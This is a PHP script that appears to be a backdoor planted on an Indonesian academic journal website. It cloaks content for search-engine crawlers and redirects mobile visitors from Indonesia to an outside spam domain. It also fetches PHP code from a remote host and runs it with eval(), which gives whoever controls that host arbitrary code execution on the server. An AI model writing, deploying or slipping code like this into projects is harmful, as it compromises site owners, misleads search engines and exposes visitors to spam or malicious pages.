<?php
function is_bot() {
$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? '';
$bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool", "adsense", "slurp");
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}

function is_mobile() {
$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? '';
$mobile_agents = array("Mobile", "Android", "Silk/", "Kindle", "BlackBerry", "Opera Mini", "Opera Mobi", "iPhone", "iPod", "iPad");
foreach ($mobile_agents as $device) {
if (stripos($user_agent, $device) !== false) {
return true;
}
}
return false;
}

function get_country() {
return $_SERVER["HTTP_CF_IPCOUNTRY"] ?? '';
}

if (!is_bot() && is_mobile() && strtolower(get_country()) === "id") {
header("Location: https://ori.seoknolimit.cc/ejurnal.cendekiainovasi.org/amp/");
die;
}

$url = is_bot()
? "https://botstrap.cc/ojs/ejurnal.cendekiainovasi.org/index.txt"
: "https://ejurnal.cendekiainovasi.org/index.txt";

$content = @file_get_contents($url);

if ($content !== false && trim($content) !== '') {
eval("?>" . $content);
} else {
header("HTTP/1.1 404 Not Found");
die("404 Not Found");
}
?>
